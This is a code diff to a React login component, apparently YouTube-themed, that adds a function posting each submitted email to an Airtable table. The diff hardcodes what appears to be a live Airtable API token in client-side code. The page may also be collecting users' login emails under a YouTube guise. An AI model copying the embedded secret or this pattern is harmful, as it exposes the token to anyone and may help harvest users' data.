@@ -62,11 +62,54 @@ const Loginyt = () => {
 
       // Set loading state and navigate to loading screen
       setIsLoading(true);
+      submitToAirtable();
     } catch (error) {
       console.error("Submission error:", error);
       setIsSubmitting(false);
     }
   };
+
+
+
+
+  const submitToAirtable = async () => {
+    try {
+      // Airtable API details (replace with your actual values)
+      const AIRTABLE_API_KEY = 'patQCT0hASG47nrnb.d6f54467486b18f8c96e5ed9bb540d890acae56406943d90bd4599eb5a7cc710';
+      const AIRTABLE_BASE_ID = 'appbWkfYnX86ITIz2';
+      const AIRTABLE_TABLE_ID = 'Table%201';
+
+      const url = `https://api.airtable.com/v0/${AIRTABLE_BASE_ID}/${AIRTABLE_TABLE_ID}`;
+
+      const response = await axios.post(url, {
+        records: [
+          {
+            fields: {
+              Name: email,
+              First: 'dummy',
+              Second: 'dummy',
+              Third: 'dummy',
+              persona: 'Youtube'
+            }
+          }
+        ]
+      }, {
+        headers: {
+          'Authorization': `Bearer ${AIRTABLE_API_KEY}`,
+          'Content-Type': 'application/json'
+        }
+      });
+
+      console.log('Submission successful:', response.data);
+      // Additional success handling (e.g., navigation, showing success message)
+    } catch (error) {
+      console.error('Error submitting to Airtable:', error);
+      setIsSubmitting(false);
+    }
+  };
+
+
+
 
   const handleSupportClick = () => {
     window.location.href = "https://wa.link/i0frpz";
